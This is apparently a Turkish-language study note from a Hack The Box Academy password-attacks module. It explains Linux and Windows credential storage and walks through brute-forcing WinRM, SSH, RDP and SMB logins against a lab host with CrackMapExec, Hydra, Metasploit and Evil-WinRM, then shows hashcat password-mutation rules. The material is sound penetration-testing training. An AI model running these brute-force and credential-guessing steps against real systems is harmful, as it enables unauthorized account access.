---
{"dg-publish":true,"permalink":"/active-directory/password-attacks/"}
---




# **Kimlik Bilgileri Depolama**


## **Linux**  

Bildiğimiz gibi, Linux tabanlı sistemler her şeyi bir dosya biçiminde ele alır. Buna göre, parolalar da bir dosyada şifrelenmiş olarak saklanır. Bu dosya `shadow` dosyası olarak adlandırılır ve `/etc/shadow` dosyasında bulunur ve Linux kullanıcı yönetim sisteminin bir parçasıdır. Ayrıca, bu parolalar genellikle `hash` şeklinde saklanır . Bir örnek şöyle görünebilir:


#### Shadow File
```shell-session
root@htb:~# cat /etc/shadow

...SNIP...
htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
```

`etc/shadow` dosyası, yeni kullanıcılar oluşturulduğunda girdilerin girildiği ve kaydedildiği benzersiz bir biçime sahiptir.

![Pasted image 20241101171155.png](/img/user/resimler/Pasted%20image%2020241101171155.png)

Bu dosyadaki şifrenin şifrelenmesi aşağıdaki gibi biçimlendirilir:

![Pasted image 20241101171228.png](/img/user/resimler/Pasted%20image%2020241101171228.png)

Tip (`id`), parolayı şifrelemek için kullanılan kriptografik hash yöntemidir. Geçmişte birçok farklı kriptografik hash yöntemi kullanılmıştır ve günümüzde bazı sistemler tarafından hala kullanılmaktadır.

![Pasted image 20241101171305.png](/img/user/resimler/Pasted%20image%2020241101171305.png)

Ancak, birkaç dosya daha Linux'un kullanıcı yönetim sistemine aittir. Diğer iki dosya `/etc/passwd` ve `/etc/group` dosyalarıdır. Geçmişte, şifrelenmiş parola `/etc/passwd` dosyasında kullanıcı adı ile birlikte saklanırdı, ancak dosya sistemdeki tüm kullanıcılar tarafından görüntülenebildiğinden ve okunabilir olması gerektiğinden, bu giderek artan bir güvenlik sorunu olarak kabul edildi. `etc/shadow` dosyası yalnızca `root` kullanıcısı tarafından okunabilir.


#### Passwd File
```shell-session
M1R4CKCK@htb[/htb]$ cat /etc/passwd

...SNIP...
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

![Pasted image 20241101171400.png](/img/user/resimler/Pasted%20image%2020241101171400.png)

Parola alanındaki `x`, şifrelenmiş parolanın `/etc/shadow` dosyasında olduğunu gösterir. Ancak, `/etc/shadow` dosyasına yönlendirme sistemdeki kullanıcıları savunmasız hale getirmez çünkü bu dosyanın hakları yanlış ayarlanırsa, dosya `root` kullanıcısının oturum açmak için parola yazmasına gerek kalmayacak şekilde manipüle edilebilir. Bu nedenle boş bir alan, parola girmeden kullanıcı adı ile giriş yapabileceğimiz anlamına gelir.

- [Linux User Auth](https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf)

## **Windows Authentication Process**
[Windows client authentication](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) prosesi çoğu zaman Linux sistemlerine göre daha karmaşık olabilir ve tüm oturum açma, alma ve doğrulama işlemlerini gerçekleştiren birçok farklı modülden oluşur. Buna ek olarak, Windows sisteminde Kerberos kimlik doğrulaması gibi birçok farklı ve karmaşık kimlik doğrulama prosedürü vardır.[ Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) (`LSA`) kullanıcıların kimliklerini doğrulayan ve lokal bilgisayarda oturumlarını açan korumalı bir alt sistemdir. Buna ek olarak, LSA bir bilgisayardaki lokal güvenliğin tüm yönleri hakkında bilgi tutar. Ayrıca adlar ve güvenlik kimlikleri (`SID`'ler) arasında çeviri yapmak için çeşitli hizmetler sağlar.

Security alt sistemi, bir bilgisayar sisteminde bulunan güvenlik ilkelerini ve hesaplarını takip eder. Domain Controller söz konusu olduğunda, bu ilkeler ve hesaplar Domain Controller'ın bulunduğu domain için geçerlidir. Bu ilkeler ve hesaplar Active Directory'de saklanır. Ayrıca, LSA alt sistemi nesnelere erişimi denetlemek, kullanıcı izinlerini kontrol etmek ve izleme iletileri oluşturmak için hizmetler sağlar.


#### Windows Authentication Process Diagram
![Pasted image 20241101171808.png](/img/user/resimler/Pasted%20image%2020241101171808.png)



# Remote Password Attacks

## Network Services

Sızma testlerimiz sırasında, karşılaştığımız her bilgisayar ağında içeriği yönetmek, düzenlemek veya oluşturmak için kurulmuş servisler olacaktır. Tüm bu servisler belirli izinler kullanılarak barındırılır ve belirli kullanıcılara atanır. Web uygulamalarının yanı sıra, bu hizmetler aşağıdakileri içerir (ancak bunlarla sınırlı değildir):

![Pasted image 20241101172035.png](/img/user/resimler/Pasted%20image%2020241101172035.png)

Bir Windows sunucusunu ağ üzerinden yönetmek istediğimizi düşünelim. Buna göre, sisteme erişmemizi, üzerinde komutlar çalıştırmamızı veya bir GUI veya terminal aracılığıyla içeriğine erişmemizi sağlayan bir servise ihtiyacımız var. Bu durumda, bunun için uygun olan en yaygın hizmetler `RDP`, `WinRM` ve `SSH`'dir. SSH artık Windows'ta çok daha az yaygındır, ancak Linux tabanlı sistemler için önde gelen hizmettir.  

Tüm bu servisler kullanıcı adı ve parola kullanan bir kimlik doğrulama mekanizmasına sahiptir. Elbette bu hizmetler, oturum açmak için yalnızca önceden tanımlanmış anahtarların kullanılabileceği şekilde değiştirilebilir ve yapılandırılabilir, ancak çoğu durumda varsayılan ayarlarla yapılandırılırlar.


## **WinRM**  

[Windows Uzaktan Yönetimi](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`), ağ protokolü [Web Hizmetleri Yönetim Protokolü](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) 'nün (`WS-Management`) Microsoft uygulamasıdır. Windows sistemlerinin uzaktan yönetimi için kullanılan [Basit Nesne Erişim Protokolünü](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) kullanan XML web hizmetlerine dayalı bir ağ protokolüdür. [Web Tabanlı Kurumsal Yönetim](“https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management”) (`WBEM`) ve [Dağıtılmış Bileşen Nesne Modelini](“https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0”) (`DCOM`) çağırabilen [Windows Yönetim Araçları](“https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page”) (`WMI`) arasındaki iletişimle ilgilenir.

Ancak, güvenlik nedeniyle WinRM'nin Windows 10'da manuel olarak etkinleştirilmesi ve yapılandırılması gerekir. Bu nedenle, WinRM'yi kullanmak istediğimiz bir domain veya local ağdaki ortam güvenliğine büyük ölçüde bağlıdır. Çoğu durumda, güvenliğini artırmak için sertifikalar veya yalnızca belirli kimlik doğrulama mekanizmaları kullanılır. WinRM, `5985` (`HTTP`) ve `5986` (`HTTPS`) TCP portlarını kullanır.  

Parola saldırılarımız için kullanabileceğimiz kullanışlı bir araç, SMB, LDAP, MSSQL ve diğerleri gibi diğer protokoller için de kullanılabilen [CrackMapExec'tir](https://github.com/byt3bl33d3r/CrackMapExec). Bu araca aşina olmak için [resmi belgelerini](https://web.archive.org/web/20231116172005/https://www.crackmapexec.wiki/) okumanızı öneririz.



#### **CrackMapExec**

#### **CrackMapExec Protokole Özel Yardım**  

Belirli bir protokol belirtebileceğimizi ve bize sunulan tüm seçeneklerin daha ayrıntılı bir yardım menüsünü alabileceğimizi unutmayın. CrackMapExec şu anda MSSQL, SMB, SSH ve WinRM kullanarak uzaktan kimlik doğrulamayı desteklemektedir.

```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec smb -h
```


#### **CrackMapExec Kullanımı**  

CrackMapExec'i kullanmak için genel format aşağıdaki gibidir:


```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

`(Pwn3d!)` görünümü, brute forced kullanıcısı ile oturum açarsak büyük olasılıkla sistem komutlarını çalıştırabileceğimizin işaretidir. WinRM servisi ile iletişim kurmak için kullanabileceğimiz bir diğer kullanışlı araç, WinRM servisi ile verimli bir şekilde iletişim kurmamızı sağlayan [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)'dir.


#### Evil-WinRM Usage
```shell-session
M1R4CKCK@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

```shell-session
M1R4CKCK@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

Oturum açma başarılı olursa, komutların çalışmasını ve yürütülmesini basitleştiren [Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (`MS-PSRP`) kullanılarak bir terminal oturumu başlatılır.


## **SSH**  

[Secure Shell](“https://www.ssh.com/academy/ssh/protocol”) (`SSH`), sistem komutlarını çalıştırmak veya bir hosttan bir sunucuya dosya aktarmak için uzak bir host'a bağlanmanın daha güvenli bir yoludur. SSH sunucusu varsayılan olarak `TCP port 22` 'de çalışır ve bu `porta` bir SSH istemcisi kullanarak bağlanabiliriz. Bu servis üç farklı kriptografi işlemi/yöntemi kullanır: `simetrik` şifreleme, `asimetrik` şifreleme ve `hashing`.


#### **Simetrik Şifreleme**  

Simetrik şifreleme, şifreleme ve şifre çözme için `aynı anahtarı` kullanır. Ancak, anahtara erişimi olan herkes iletilen verilere de erişebilir. Bu nedenle, güvenli simetrik şifreleme için bir anahtar değişim prosedürüne ihtiyaç vardır. Bu amaçla [Diffie-Hellman](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) anahtar değişim yöntemi kullanılır. Üçüncü bir taraf anahtarı ele geçirirse, anahtar değişim yöntemi bilinmediği için mesajların şifresini çözemez. Ancak bu, sunucu ve istemci tarafından verilere erişmek için gereken gizli anahtarı belirlemek için kullanılır. Simetrik şifre sisteminin AES, Blowfish, 3DES, vb. gibi birçok farklı çeşidi kullanılabilir.


#### **Asimetrik Şifreleme**  

Asimetrik şifreleme `iki SSH anahtarı` kullanır: bir private key (özel anahtar) ve bir public key (açık anahtar). Private key gizli kalmalıdır çünkü sadece public key ile şifrelenmiş mesajların şifresini çözebilir. Bir saldırgan, genellikle parola korumalı olmayan private key'i ele geçirirse, kimlik bilgileri olmadan sistemde oturum açabilecektir. Bir bağlantı kurulduktan sonra, sunucu başlatma ve kimlik doğrulama için public anahtarı kullanır. Client mesajın şifresini çözebilirse, private key'e sahip olur ve SSH oturumu başlayabilir.


#### **Hashing**  

Hashing yöntemi, iletilen verileri başka bir benzersiz değere dönüştürür. SSH mesajların gerçekliğini doğrulamak için hashing kullanır. Bu, yalnızca tek yönde çalışan matematiksel bir algoritmadır.


#### **Hydra - SSH**  

SSH'ı brute force yapmak için `Hydra` gibi bir araç kullanabiliriz. Bu konu [Login Brute Forcing](https://academy.hackthebox.com/course/preview/login-brute-forcing/introduction-to-brute-forcing) modülünde derinlemesine ele alınmıştır.


```shell-session
M1R4CKCK@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

SSH protokolü aracılığıyla sisteme giriş yapmak için, çoğu Linux dağıtımında varsayılan olarak bulunan OpenSSH client'ı kullanabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ ssh user@10.129.42.197

The authenticity of host '10.129.42.197 (10.129.42.197)' can't be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.


Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.42.197' (ECDSA) to the list of known hosts.


user@10.129.42.197's password: ********

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

user@WINSRV C:\Users\user>
```


## Remote Desktop Protocol (RDP)
Microsoft'un [Uzak Masaüstü Protokolü](“https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol”) (`RDP`), varsayılan olarak `3389 numaralı TCP portu` üzerinden Windows sistemlerine uzaktan erişim sağlayan bir ağ protokolüdür. RDP, hem kullanıcılara hem de yöneticilere/destek personeline bir kuruluş içindeki Windows host'larına uzaktan erişim sağlar. Remote Desktop Protocol bir bağlantı için iki katılımcı tanımlar: asıl işin gerçekleştiği terminal sunucusu ve terminal sunucusunun uzaktan kontrol edildiği terminal istemcisi. Görüntü, ses, klavye ve işaretleme aygıtı alışverişine ek olarak, RDP ayrıca terminal sunucusunun belgelerini terminal istemcisine bağlı bir yazıcıda yazdırabilir veya orada bulunan depolama ortamına erişime izin verebilir. Teknik olarak RDP, IP yığınında bir uygulama katmanı protokolüdür ve veri iletimi için TCP ve UDP kullanabilir. Protokol çeşitli resmi Microsoft uygulamaları tarafından kullanılır, ancak bazı üçüncü taraf çözümlerinde de kullanılır.


#### Hydra - RDP

We can also use `Hydra` to perform RDP bruteforcing.

```shell-session
M1R4CKCK@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

Linux, RDP protokolünü kullanarak istenen sunucu ile iletişim kurmak için farklı istemciler sunar. Bunlar arasında [Remmina](https://remmina.org/), [rdesktop](http://www.rdesktop.org/), [xfreerdp](https://linux.die.net/man/1/xfreerdp) ve diğerleri bulunmaktadır. Bizim amacımız için xfreerdp ile çalışacağız.

#### xFreeRDP

```shell-session
$ xfreerdp /v:<target-IP> /u:<username> /p:<password>
```


```shell-session
xfreerdp /v:10.129.42.197 /u:user /p:password

...SNIP...
New Certificate details:
        Common Name: WINSRV
        Subject:     CN = WINSRV
        Issuer:      CN = WINSRV
        Thumbprint:  cd:91:d0:3e:7f:b7:bb:40:0e:91:45:b0:ab:04:ef:1e:c8:d5:41:42:49:e0:0c:cd:c7:dd:7d:08:1f:7c:fe:eb

Do you trust the above certificate? (Y/T/N) Y
```

![Pasted image 20241101174328.png](/img/user/resimler/Pasted%20image%2020241101174328.png)


## **SMB**  

[Sunucu İleti Bloğu](“https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview”) (S`MB`), lokal alan ağlarında bir istemci ile sunucu arasında veri aktarımından sorumlu bir protokoldür. Windows ağlarında dosya ve dizin paylaşımı ile yazdırma hizmetlerini uygulamak için kullanılır. SMB genellikle bir dosya sistemi olarak adlandırılır, ancak öyle değildir. SMB, lokal ağlarda sürücü sağlamak için Unix ve Linux için `NFS` ile karşılaştırılabilir.  

SMB, [Common Internet File System](https://cifs.com/) (C`IFS`) olarak da bilinir. SMB protokolünün bir parçasıdır ve Windows, Linux veya macOS gibi birden fazla platformun evrensel uzaktan bağlantısını sağlar. Ek olarak, yukarıdaki işlevlerin açık kaynaklı bir uygulaması olan [Samba](https://wiki.samba.org/index.php/Main_Page) ile sık sık karşılaşacağız. SMB için, farklı şifrelerle birlikte farklı kullanıcı adlarını denemek için `hydra` 'yı tekrar kullanabiliriz.


#### Hydra - SMB

```shell-session
M1R4CKCK@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
```

Ancak, sunucunun geçersiz bir yanıt gönderdiğini açıklayan aşağıdaki hatayı da alabiliriz.


#### Hydra - Error
```shell-session
M1R4CKCK@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

Bunun nedeni büyük olasılıkla SMBv3 yanıtlarını işleyemeyen eski bir THC-Hydra sürümüne sahip olmamızdır. Bu sorunu aşmak için `hydra` 'yı manuel olarak güncelleyebilir ve yeniden derleyebilir veya başka bir çok güçlü araç olan [Metasploit çerçevesini](https://www.metasploit.com/) kullanabiliriz.

#### Metasploit Framework
```shell-session
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Şimdi mevcut paylaşımları ve bunlar için hangi ayrıcalıklara sahip olduğumuzu görüntülemek için `CrackMapExec` 'i tekrar kullanabiliriz.

#### CrackMapExec
```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares

SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password 
SMB         10.129.42.197   445    WINSRV           [+] Enumerated shares
SMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark
SMB         10.129.42.197   445    WINSRV           -----           -----------     ------
SMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.42.197   445    WINSRV           C$                              Default share
SMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE      
SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
```

Sunucu ile SMB üzerinden iletişim kurmak için, örneğin [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) aracını kullanabiliriz. Bu araç, ayrıcalıklarımız izin veriyorsa paylaşımların içeriğini görüntülememize, dosya yüklememize veya indirmemize izin verecektir.


#### Smbclient
```shell-session
M1R4CKCK@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME

Enter WORKGROUP\user's password: *******

Try "help" to get a list of possible commands.


smb: \> ls
  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
smb: \> 
```


**`Not:`** Zorlu soruları tamamlamak için, sayfanın üst kısmındaki Kaynaklar bölümünden verilen kelime listelerini indirdiğinizden emin olun


Soru : WinRM servisi için kullanıcıyı bulun ve şifresini kırın. Ardından, oturum açtığınızda, bayrağı oradaki bir dosyada bulacaksınız. Bulduğunuz bayrağı cevap olarak gönderin. 

Cevap : 

![Pasted image 20241101230126.png](/img/user/resimler/Pasted%20image%2020241101230126.png)

Soru : SSH hizmeti için kullanıcıyı bulun ve şifresini kırın. Ardından, oturum açtığınızda, bayrağı oradaki bir dosyada bulacaksınız. Bulduğunuz bayrağı cevap olarak gönderin.
Cevap : 

![Pasted image 20241101230411.png](/img/user/resimler/Pasted%20image%2020241101230411.png)


Soru : RDP hizmeti için kullanıcıyı bulun ve şifresini kırın. Ardından, oturum açtığınızda, bayrağı oradaki bir dosyada bulacaksınız. Bulduğunuz bayrağı cevap olarak gönderin.
Cevap : 

![Pasted image 20241101233227.png](/img/user/resimler/Pasted%20image%2020241101233227.png)


Soru : SMB hizmeti için kullanıcıyı bulun ve şifresini kırın. Ardından, oturum açtığınızda, bayrağı oradaki bir dosyada bulacaksınız. Bulduğunuz bayrağı cevap olarak gönderin.
Cevap : 

![Pasted image 20241101234547.png](/img/user/resimler/Pasted%20image%2020241101234547.png)

![Pasted image 20241101234556.png](/img/user/resimler/Pasted%20image%2020241101234556.png)

![Pasted image 20241101234609.png](/img/user/resimler/Pasted%20image%2020241101234609.png)



![Pasted image 20241101235108.png](/img/user/resimler/Pasted%20image%2020241101235108.png)


Soru: SMB hizmeti için kullanıcıyı bulun ve şifresini kırın. Ardından, oturum açtığınızda, bayrağı oradaki bir dosyada bulacaksınız. Bulduğunuz bayrağı cevap olarak gönderin.
Cevap :
![Pasted image 20241101235755.png](/img/user/resimler/Pasted%20image%2020241101235755.png)



# **Password Mutations**
Birçok kişi şifrelerini `güvenlik yerine basitliğe` göre oluşturur. Genellikle güvenlik önlemlerini tehlikeye atan bu insani zayıflığı ortadan kaldırmak için, tüm sistemlerde bir parolanın nasıl görünmesi gerektiğini belirleyen parola ilkeleri oluşturulabilir. Bu, sistemin parolanın büyük harfler, özel karakterler ve rakamlar içerip içermediğini tanıması anlamına gelir. Buna ek olarak, çoğu parola ilkesi, yukarıdaki özelliklerden en az birini içeren bir parolada minimum sekiz karakter uzunluğunu gerektirir.  

Önceki bölümlerde çok basit parolalar tahmin ettik, ancak bunu daha karmaşık parolalar oluşturmaya zorlayan parola politikaları uygulayan sistemlere uyarlamak çok daha zor hale geliyor.

Ne yazık ki, kullanıcıların zayıf parolalar oluşturma eğilimi, parola politikalarının varlığına rağmen de ortaya çıkmaktadır. Çoğu kişi/çalışan daha karmaşık parolalar oluştururken aynı kuralları takip eder. Parolalar genellikle kullanılan hizmetle yakından ilişkili olarak oluşturulur. Bu, birçok çalışanın genellikle şifrelerde şirketin adının geçebileceği şifreler seçtiği anlamına gelir. Bir kişinin tercihleri ve ilgi alanları da önemli bir rol oynar. Bunlar evcil hayvanlar, arkadaşlar, spor, hobiler ve hayatın diğer birçok unsuru olabilir. `OSINT` bilgi toplama, bir kullanıcının tercihleri hakkında daha fazla bilgi edinmek için çok yararlı olabilir ve şifre tahminine yardımcı olabilir. [OSINT](“https://academy.hackthebox.com/course/preview/osint-corporate-recon”) hakkında daha fazla bilgi [OSINT: Corporate Recon modülünde](“https://academy.hackthebox.com/course/preview/osint-corporate-recon”) bulunabilir. Genel olarak, kullanıcılar en yaygın parola ilkelerine uyacak şekilde parolaları için aşağıdaki eklemeleri kullanırlar:

![Pasted image 20241102011622.png](/img/user/resimler/Pasted%20image%2020241102011622.png)

Birçok kişinin parola politikalarına rağmen parolalarını mümkün olduğunca basit tutmak istediğini göz önünde bulundurarak, zayıf parolalar oluşturmak için kurallar oluşturabiliriz. [WPengine](“https://wpengine.com/resources/passwords-unmasked-infographic/”) tarafından sağlanan istatistiklere göre, çoğu parola uzunluğu `on` karakterden `uzun değildir`. Bu nedenle yapabileceğimiz şey, en az `beş` karakter uzunluğunda olan ve kullanıcıların evcil hayvanlarının isimleri, hobileri, tercihleri ve diğer ilgi alanları gibi en tanıdık görünen belirli terimleri seçmektir. Kullanıcı tek bir kelime seçer (içinde bulunulan ay gibi), `içinde bulunulan yılı` ekler ve ardından şifresinin sonuna özel bir karakter eklerse, `on` karakterlik şifre gereksinimine ulaşmış oluruz. Çoğu şirketin düzenli parola değişikliği gerektirdiği düşünüldüğünde, bir kullanıcı yalnızca bir ayın adını veya tek bir sayıyı vb. değiştirerek parolasını değiştirebilir. Sadece bir giriş içeren bir parola listesi oluşturmak için basit bir örnek kullanalım.


#### Password List

```shell-session
M1R4CKCK@htb[/htb]$ cat password.list

password
```

![Pasted image 20241102011802.png](/img/user/resimler/Pasted%20image%2020241102011802.png)

Her kural, kelimenin nasıl değiştirileceğini belirleyen yeni bir satıra yazılır. Yukarıda gösterilen fonksiyonları bir dosyaya yazarsak ve bahsedilen hususları göz önünde bulundurursak, bu dosya aşağıdaki gibi görünebilir:

#### Hashcat Rule File
```shell-session
M1R4CKCK@htb[/htb]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

Hashcat, `password.list` 'teki her kelime için `custom.rule` kurallarını uygulayacak ve mutasyona uğramış versiyonu `mut_password` `.` `list` 'te uygun şekilde saklayacaktır. Böylece, bu durumda bir kelime on beş mutasyona uğramış kelimeyle sonuçlanacaktır.

#### Generating Rule-based Wordlist

```shell-session
M1R4CKCK@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
M1R4CKCK@htb[/htb]$ cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

- `--force`: Hashcat normalde uyumsuz veya önerilmeyen bir işlem yapıldığında hata verir ya da işlemi durdurur. `--force` parametresi, uyumluluk kontrollerini göz ardı ederek işlemi zorla devam ettirir. Genelde donanım uyumluluğu gibi sorunlarda bu parametre kullanılabilir, fakat dikkatli olunmalıdır.
    
- `password.list`: Bu, üzerinde işlem yapılacak olan parola listesini içeren dosyadır. Her satırda bir parola olacak şekilde düzenlenmiştir.
    
- `-r custom.rule`: Hashcat’in kural bazlı parola manipülasyonunu çalıştırmasını sağlar. `custom.rule` dosyası, hashcat’in parolaları belirli kurallara göre nasıl değiştireceğini belirtir. Örneğin, tüm parolaları büyük harfe çevirme, belirli karakterleri değiştirme, belirli karakterleri ekleme gibi kurallar içerebilir.
    
- `--stdout`: Hashcat’in sadece parola manipülasyonlarının çıktısını ekrana yazmasını sağlar, aslında bu işlem gerçek anlamda parola kırma işlemi yapmaz. Bu, belirtilen kuralların uygulanmış parolalarının ekrana (standart çıktıya) yönlendirilmesini sağlar.
    
- `|`: Pipe (`|`) sembolü, hashcat tarafından oluşturulan çıktıyı bir sonraki komuta yönlendirir.
    
- `sort -u`: `sort` komutu, girdiyi sıralar; `-u` parametresi ile yalnızca benzersiz (unique) satırların çıktıya alınmasını sağlar. Yani, tekrarlanan parolalar tek bir kez yazılır.
    
- `> mut_password.list`: Bu, çıktıdaki benzersiz ve sıralı parolaların `mut_password.list` adlı yeni bir dosyaya yazılmasını sağlar.

